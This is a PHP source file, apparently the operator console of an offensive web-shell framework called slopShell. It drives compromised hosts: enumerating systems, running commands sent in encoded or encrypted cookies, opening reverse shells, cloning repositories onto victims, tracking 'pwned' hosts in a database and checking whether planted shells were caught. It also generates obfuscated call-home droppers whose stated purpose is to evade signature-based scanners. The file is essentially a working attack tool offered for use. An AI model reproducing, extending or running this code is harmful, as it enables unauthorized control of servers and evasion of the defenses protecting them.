<?php
if (strtolower(php_uname()) == "windows") {
    define('clears', 'cls');
}else{
    define('clears', "clear");
}
require "includes/db/postgres_checker.php";
require "includes/droppers/dynamic_generator.php";
$cof = array(
    "useragent"=> "sp1.1",
    "proxy"=> "",
    "host"=>"127.0.0.1",
    "port"=>"5432",
    "username"=>"notroot",
    "password"=>"",
    "dbname"=>"sloppy_bots"
);
//todo need to figure out why this is no longer working on raspi
//$success = null;
//$te = system("bg $( which bash ) -c 'nohup proxybroker serve --host 127.0.0.1 --port 8090 --types HTTPS HTTP --lvl High &'", $success);
is_file("sloppy_config.ini") ? define("config", parse_ini_file('sloppy_config.ini', true)):define("config", $cof);

try{
    define("CHH", curl_init());
    if (is_null(config['proxy'])) {
        echo "Not setting proxy information";
        curl_setopt(CHH, CURLOPT_USERAGENT, config['useragent']);
    }else{
        curl_setopt(CHH, CURLOPT_USERAGENT, config['useragent']);
        curl_setopt(CHH, CURLOPT_PROXY, config["proxy"]);
    }
}catch (Exception $e){
    print("{$e}\n\n");
}

function logo($last, $cl, bool $error, $error_value){
    if ($last === "q"){
        system($cl);
        system("killall proxybroker");
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m    ▄▄▄▄▄   █    ████▄ █ ▄▄  █ ▄▄ ▀▄    ▄     ▄█▄    █    ▄█ ▄███▄      ▄     ▄▄▄▄▀ \033[0m\n");
        echo("\033[33;40m   █     ▀▄ █    █   █ █   █ █   █  █  █      █▀ ▀▄  █    ██ █▀   ▀      █ ▀▀▀ █    \033[0m\n");
        echo("\033[33;40m ▄  ▀▀▀▀▄   █    █   █ █▀▀▀  █▀▀▀    ▀█       █   ▀  █    ██ ██▄▄    ██   █    █    \033[0m\n");
        echo("\033[33;40m  ▀▄▄▄▄▀    ███▄ ▀████ █     █       █        █▄  ▄▀ ███▄ ▐█ █▄   ▄▀ █ █  █   █     \033[0m\n");
        echo("\033[33;40m                ▀       █     █    ▄▀         ▀███▀      ▀ ▐ ▀███▀   █  █ █  ▀      \033[0m\n");
        echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m  Gr33tz: Notroot, J5                                                               \033[0m\n");
        echo("\033[33;40m  Git: https://github.com/oldkingcone/slopShell                                     \033[0m\n");
        print("\033[33;40m  All proxybroker instances have been killed, they died in peace.. in their sleep. F in chat to pay respects.\n");
    }else if (is_null($last))  {
        system($cl);
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m    ▄▄▄▄▄   █    ████▄ █ ▄▄  █ ▄▄ ▀▄    ▄     ▄█▄    █    ▄█ ▄███▄      ▄     ▄▄▄▄▀ \033[0m\n");
        echo("\033[33;40m   █     ▀▄ █    █   █ █   █ █   █  █  █      █▀ ▀▄  █    ██ █▀   ▀      █ ▀▀▀ █    \033[0m\n");
        echo("\033[33;40m ▄  ▀▀▀▀▄   █    █   █ █▀▀▀  █▀▀▀    ▀█       █   ▀  █    ██ ██▄▄    ██   █    █    \033[0m\n");
        echo("\033[33;40m  ▀▄▄▄▄▀    ███▄ ▀████ █     █       █        █▄  ▄▀ ███▄ ▐█ █▄   ▄▀ █ █  █   █     \033[0m\n");
        echo("\033[33;40m                ▀       █     █    ▄▀         ▀███▀      ▀ ▐ ▀███▀   █  █ █  ▀      \033[0m\n");
        echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m  Gr33tz: Notroot, J5                                                               \033[0m\n");
        echo("\033[33;40m  Git: https://github.com/oldkingcone/slopShell                                     \033[0m\n");
        menu();
    }else{
        system($cl);
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m    ▄▄▄▄▄   █    ████▄ █ ▄▄  █ ▄▄ ▀▄    ▄     ▄█▄    █    ▄█ ▄███▄      ▄     ▄▄▄▄▀ \033[0m\n");
        echo("\033[33;40m   █     ▀▄ █    █   █ █   █ █   █  █  █      █▀ ▀▄  █    ██ █▀   ▀      █ ▀▀▀ █    \033[0m\n");
        echo("\033[33;40m ▄  ▀▀▀▀▄   █    █   █ █▀▀▀  █▀▀▀    ▀█       █   ▀  █    ██ ██▄▄    ██   █    █    \033[0m\n");
        echo("\033[33;40m  ▀▄▄▄▄▀    ███▄ ▀████ █     █       █        █▄  ▄▀ ███▄ ▐█ █▄   ▄▀ █ █  █   █     \033[0m\n");
        echo("\033[33;40m                ▀       █     █    ▄▀         ▀███▀      ▀ ▐ ▀███▀   █  █ █  ▀      \033[0m\n");
        echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m  Last command: $last                                                               \033[0m\n");
        if ($error === true && !empty($error_value)) {
            if (is_array($error_value)) {
                echo("\033[33;40m  What was the error:                                                           \033[0m\n");
                echo "\t".print_r($error_value);
                echo "\n";
            }else{
                echo("\033[33;40m  User Supplied Values:\n$error_value                                                           \033[0m\n");
            }
        }
        menu();
    }

}

function menu()
{
    echo <<< _MENU
        (O)ptions                                                                   
        (S)ystem enumeration                                                        
        (R)everse shell                                                             
        (C)ommand Execution                                                         
        (CL)oner
        (CR)eate Dropper                                                                  
        (U)pdates  -> not implemented yet.                                                                 
        (A)dd new host                                                              
        (CH)eck if hosts are still pwned                                            
        (M)ain menu                                                                 
        (Q)uit                                                                      
_MENU;
    echo "\n\n\033[0m\n";

}

function opts(){
    $ppg = pg_connect("host=" . config['host'] . " port=" . config['port'] . " user=" . config['username'] . " password=" . config['password'] . "dbname=".config['dbname']);
    print("\n\nCurrent options enabled:\n\n");
    foreach (config as $temp=>$values){
        print($temp." => ".$values."\n");
    }
    print("\n\n".str_repeat("-", 35) . "\n");
    print("\n\nCurrent DB Status:\n\n");
    if ($ppg == PGSQL_CONNECTION_OK or $ppg == PGSQL_CONNECTION_AUTH_OK){
        print("\nConnected!");
        print("\nPG Host: ". pg_host($ppg));
        print("\nPG Port: ". pg_port($ppg));
        print("\nPG Ping? ". pg_ping($ppg));
    }else{
        print("Could not connect... ensure the DB is running and we are allowed to connect to it.");
    }
    print("\n\n".str_repeat("-", 35) . "\n");
    print("\n\nProxybroker?\n\n");
    system("ps aux | grep proxybroker");
    echo "\n";
}

function sys($host, $uri)
{
    if (!empty($host) && !empty($userA)) {
        curl_setopt(CHH, CURLOPT_URL,               "$host/$uri?qs=cqBS");
        curl_setopt(CHH, CURLOPT_TIMEOUT,                              15);
        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       15);
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
        $syst = curl_exec(CHH);
        if (!curl_errno(CHH)){
            switch ($http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                case 200:
                    return $syst;
                default:
                    throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
            }

        }
    } else {
        logo('s', clears, true, "Host and/or URI was empty, please double check.");
    }
    return 0;
}

function rev($host, $shell, $port, $os)
{
    $usePort = null;
    $Ushell = null;
    if (isset($host) and isset($port)) {
        if ($port === "default" && $shell === "default" && $os === "win") {
            $usePort = "1634";
            $Ushell = "cmd";
        } elseif($os === "lin") {
            $usePort = "1634";
            $Ushell = "bash";
        }else{
            $Ushell = $shell;
            $usePort = $port;
        }
        if (!is_null($Ushell)){
            echo "[ !! ] Setting custom options: \n";
            echo "Shell: ".$Ushell."\n";
            echo "OS: ". $os."\n";
        }
        echo "[ ++ ] Trying: " . $host . " on " . $usePort . "[ ++ ]\n";
    }else{
        logo('reverse', clears, true, '');
    }

}

function co($command, $host, $uri, bool $encrypt)
{
    $space_Safe_coms = null;
    $cr = null;
    if ($encrypt === true && !is_null($command)){
        $our_nonce = random_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
        $secure_Key = random_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_KEYBYTES);
        $additionalData = random_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_ABYTES);
        try{
            $un = base64_encode(serialize(array("plain" => $command)));
            $ct = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt($un, $additionalData, $our_nonce, $secure_Key);
            $cr = "2";
            $space_Safe_coms = base64_encode(bin2hex($our_nonce).".".bin2hex($secure_Key).".". bin2hex($additionalData).".".base64_encode($ct));
        }catch (SodiumException $exception){
            echo $exception->getMessage();
            echo $exception->getTraceAsString();
            echo $exception->getLine();
        }
    }else{
        $cr = "1";
        $space_Safe_coms = base64_encode(serialize(array("cr"=>base64_encode($command))));
    }
    if (!empty($host) && !is_null($space_Safe_coms) && !is_null($cr) && !empty($uri)) {
        curl_setopt(CHH, CURLOPT_URL,                       "$host/$uri");
        curl_setopt(CHH, CURLOPT_TIMEOUT,                             15);
        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                      15);
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
        curl_setopt(CHH, CURLOPT_POST,                              true);
        //this is the default value the shell will be looking for, change it make it unique.
        // and for those of you who read the source before you run. Howd ya get so smort.
        curl_setopt(CHH, CURLOPT_COOKIE,          "cx={$space_Safe_coms}");
        curl_setopt(CHH, CURLOPT_POSTFIELDS,                   "cr={$cr}");
        $syst = curl_exec(CHH);
        if (!curl_errno(CHH)){
            switch ($http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                case 200:
                    return $syst;
                default:
                    throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
            }

        }
    } else {
        $error = array(
            "Command" => $command,
            "Host" => $host,
            "URI" => $uri
        );
        logo('co', clears, true, $error);
    }
    return 0;
}

function clo($host, $repo, $uri)
{
    if (!empty($host) && !empty($repo) && !empty($uri)){
        curl_setopt(CHH, CURLOPT_URL,                       "$host/$uri");
        curl_setopt(CHH, CURLOPT_TIMEOUT,                              15);
        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       15);
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
        curl_setopt(CHH, CURLOPT_POST,                              true);
        curl_setopt(CHH, CURLOPT_POSTFIELDS,               "clone=$repo");
        $re = curl_exec(CHH);
        $http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE);
        if (!curl_errno(CHH)){
            switch ($http_code){
                case 200:
                    return $re;
                default:
                    throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
            }
        }else{
            $errors = array(
                "Host" => $host,
                "Repo" => $repo,
                "Target URI" => $uri,
                "Curl Error" => $http_code
            );
            logo('cloner', clears, true, $errors);
        }
    }else{
        $errors = array(
            "Host" => $host,
            "Repo" => $repo,
            "Target URI" => $uri
        );
        logo('cloner', clears, true, $errors);
    }

}

function createDropper($callHome, $callhomePort, $duration, $obfsucate, $depth)
{
    echo "Starting dropper creation\n";
    $file_in = "includes/base.php";
    $slop = getcwd() . "/slop.php";
    $t = new dynamic_generator();
    if (!empty($callHome) && !empty($duration) && !empty($depth) && !empty($obfsucate)){
        try{
            switch ($obfsucate){
                case "y":
                    $ob = "includes/droppers/dynamic/obfuscated/".bin2hex(random_bytes(rand(5,25))).".php";
                    if ((int)$depth > 23) {
                        print("Depth needs to be 23 or lower, too much depth causes the script obfuscation to be redundant.\n Since you want a higher depth, going to encrypt the payload/shell.");
                        $encrypt = true;
                        $depth = 23;
                    }else{
                        print("Trying randomness with {$depth}\n");
                        $encrypt = false;
                    }
                    print("Generated dropper will be: {$ob}\n");
                    $t->begin_junk($file_in, $depth, $ob, "ob", $encrypt, $callHome, $callhomePort, 1000, $slop);
                    system("ls -lah includes/droppers/dynamic/obfuscated");
                    break;
                case "n":
                    $n = "includes/droppers/dynamic/raw/".bin2hex(random_bytes(rand(5,25))).".php";
                    print("Generated Dropper will be: {$n}\n");
                    $t->begin_junk($file_in, "0", $n, "n", false, $callHome, $callhomePort, 1000, $slop);
                    system("ls -lah includes/droppers/dynamic/raw");
                    break;
            }

        }catch (Exception $exception){
            $empty = array(
                "Callhome" => $callHome,
                "Duration" => $duration,
                "Obfuscate" => $obfsucate,
                "Depth" => $depth,
                "Actual Exception" => $exception
            );
            logo('cr', clears, true, $empty);
        }

    }else{
        $empty = array(
            "Callhome" => $callHome,
            "Duration" => $duration,
            "Obfuscate" => $obfsucate,
            "Depth" => $depth
        );
        logo('cr', clears, true, $empty);
    }
}

function aHo($host, $os, $checkIn)
{
    $t = new postgres_checker();
    if (!empty($host)){
        $path = parse_url($host);
        if ($t->insertHost($path['scheme']."://".$path['host'].":".$path['port'], $path['path'], $os, $checkIn) != 0){
            echo "Successfully added: $host";
        }else{
            echo "There was an error. Double checking the database.";
            if (!$t->checkDB()){
                echo "There is a sevre error in the db, you need to ensure you have it crated.";
                echo "Attempting to re-create or create the DB.";
                if ($t->createDB()){
                    echo "Created the db successfully! Please re run this command to insert the new host.";
                }
            }else{
                echo "Seems as though the information supplied, was bad..\nOr the host already is in the DB.";
                $t->getRecord($host);
            }
        }
    }else{
        logo('add host', clears, true, $host);
    }
}

function check($host, $path, $batch)
{
    $dbC = pg_connect("host=" . config['host'] . " port=" . config['port'] . " user=" . config['username'] . " dbname=" . config['dbname']);
    if (!empty($batch)){
        switch ($batch){
            case "y":
                $c = pg_exec($dbC, "SELECT rhost,uri FROM sloppy_bots_main WHERE NOT NULL OR NOT '-'");
                $count = pg_exec($dbC, 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
                echo "Pulling: ". pg_fetch_row($count)."\nThis could take awhile.";
                curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
                curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
                curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
                foreach (pg_fetch_all($c) as $r){
                    if (!empty($r)){
                        curl_setopt(CHH, CURLOPT_URL,                "$r[0]/$r[1]?qs=cqS");
                        $syst = curl_exec(CHH);
                        if (!curl_errno(curl_getinfo(CHH, CURLINFO_HTTP_CODE))){
                            switch ($syst){
                                case 200:
                                    echo "Host is still ours!\n";
                                    break;
                                case 404:
                                    echo "Looks like our shell was caught... sorry..\n";
                                    break;
                                case 500:
                                    echo "Your useragent was not the correct one... did you forget??\n";
                                    break;
                                default:
                                    echo "Hmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\n";
                                    break;
                            }
                        }

                    }
                }
                break;
            case "n":
                if (!empty($host) && !empty($path)){
                    curl_setopt(CHH, CURLOPT_URL,               "$host/$path?qs=cqS");
                    curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
                    curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
                    curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
                    $syst = curl_exec(CHH);
                    if (!curl_errno(curl_getinfo(CHH, CURLINFO_HTTP_CODE))){
                        switch ($syst){
                            case 200:
                                echo "Host is still ours!\n";
                                break;
                            case 404:
                                echo "Looks like our shell was caught... sorry..\n";
                                break;
                            case 500:
                                echo "Your useragent was not the correct one... did you forget??\n";
                                break;
                            default:
                                echo "Hmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\n";
                                break;
                        }
                    }
                }
        }
    }else{
        logo("cr", "", true, "");
    }
}

function queryDB($host, $fetchWhat)
{
    # place holder for the query db function. this will check what information we have about a host, and which options to set.
    # so Example would be a windows based host, it will preset windows options for you when you execute rev, or you can set your own.
    # work in progress.
    # @todo
    if (!empty($host) || $host != 0){
        try {
            $dbC = pg_connect("host=" . config['host'] . " port=" . config['port'] . " user=" . config['username'] . " password=" . config['password'] . " dbname=" . config['dbname']);
            switch(strtolower($fetchWhat)){
                case "r":
                    $row = pg_fetch_row($dbC, sprintf("SELECT os_flavor FROM sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($host)));
                    break;
                default:
                    $row = pg_fetch_row($dbC, sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($host)));
                    break;
            }
            if (!empty($row)){
                return $row[0];
            }else{
                return 0;
            }
        }catch (Exception $e){
            $errors = array(
                "Host" => $host,
                "Fetch What?" => $fetchWhat,
                "Explicit Error" => $e
            );
            logo('query DB', clears, true, $errors);
        }


    }else {
        $errors = array(
            "Host" => $host,
            "Fetch What?" => $fetchWhat
        );
        logo('query DB', clears, true, $errors);
    }
    return 0;
}


$run = true;
logo($lc = null, clears, "", "");
while ($run) {
    print("\n\033[33;40mPlease select your choice: \n->");
    echo("\033[0m");
    $pw = trim(fgets(STDIN));
    $lc = $pw;
    logo($lc, clears, "", "");
    switch (strtolower($pw)) {
        case "cr":
            system(clears);
            echo("Where are we calling home to? (hostname/ip)->");
            $h_name = trim(fgets(STDIN));
            echo("Which port are we calling home on?");
            $h_port = trim(fgets(STDIN));
            echo("How often should we call home? (int) ->");
            $d_int = trim(fgets(STDIN));
            echo("Do we need to obfuscate? (y/n) ->");
            $osb = trim(fgets(STDIN));
            if (strtolower($osb) == "y") {
                echo("Level of depth? This will add more randomness to the file making it less likely to be caught by signature based scanners. (int) ->");
                $de = trim(fgets(STDIN));
            }else{
                $de = "0";
            }
            createDropper($h_name, $h_port, $d_int, $osb, $de);
            break;
        case "s":
            system(clears);
            $h = readline("Which host are we checking?\n->");
            try {
                sys($h, queryDB($h, "s"));
            }catch (Exception $e){
                logo("s", clears, true, $e);
            }
            break;
        case "r":
            system(clears);
            $h = readline("Please tell me the host.\n->");
            $p = readline("\nWhich port shall we use?\n->");
            try {
                $o = !empty(queryDB($h, 'r')) ? "win" : "lin";
            } catch (Exception $e) {
                logo("r", clears, true, $e);
            }
            echo $o;
            if (!empty($h) && !empty($p)){
                rev($host=$h,"default", $port=$p, $o);
            }
            break;
        case "c":
            system(clears);
            try{
                $h = readline("Which host are we sending the command to?\n->");
                $c = readline("And now the command: \n->");
                $e = readline("Are we needing to encrypt?\n(y/n)->");
                switch (strtolower($e)){
                    case "y":
                        $encrypt = true;
                        break;
                    default:
                        $encrypt = false;
                        break;
                }
                co($c, $h, queryDB($h, 'c'), $encrypt); // defaulting to false for now. until all apsects of that call are worked out and added to the shell.
            }catch (Exception $e){
                logo("c", clears, true, $e);
            }
            break;
        case "cl":
            system(clears);
            try{
                $h = readline("Which host are we interacting with?\n->");
                $rep = readline("Repo to clone?\n->");
                clo($h, $rep, queryDB($h, "cl"));
            }catch (Exception $e){
                logo("cl", clears, true, $e);
            }
            break;
        case "u":
            system(clears);
            if (strstr(getcwd(), "slopShell") == true) {
                system("git pull");
            }else{
                $homie = readline("Where is slopshell downloaded to?->");
                system("cd {$homie} && git pull");
            }
            break;
        case "a":
            system(clears);
            try{
                $h = readline("Who did we pwn my friend?\n->");
                $o = readline("Do you know the OS?\n->");
                aHo($h, $o, 0);
            }catch (Exception $e){
                logo("a", clears, true, $e);
            }
            break;
        case "ch":
            system(clears);
            try{
                $h = readline("Who is it we need to check on?\n->");
                $b = readline("Is this going to be a batch job?(Y/N)\n->");
                switch (!empty(strtolower($b))){
                    case "n":
                        echo "Not executing batch job.\n";
                        check($h, queryDB($h, "ch"), "n");
                        break;
                    case "y":
                        echo "Executing batch job!\n";
                        check($h, 'b', "y");
                        break;
                    default:
                        logo('ch',clears,true ,"Your host was empty, sorry but I will return you to the previous menu.\n");
                        break;
                }
            }catch (Exception $e){
                logo("ch", clears, true, $e);
            }
            break;
        case "m":
            logo($lc, clears, "", "");
            break;
        case "q":
            logo('q', clears, false, '');
            $run = false;
            break;
        case "o":
            opts();
            break;
        default:
            logo($lc, clears, "", "");
            echo "\033[33;40myou need to select a valid option...\033[0m\n";
    }
}

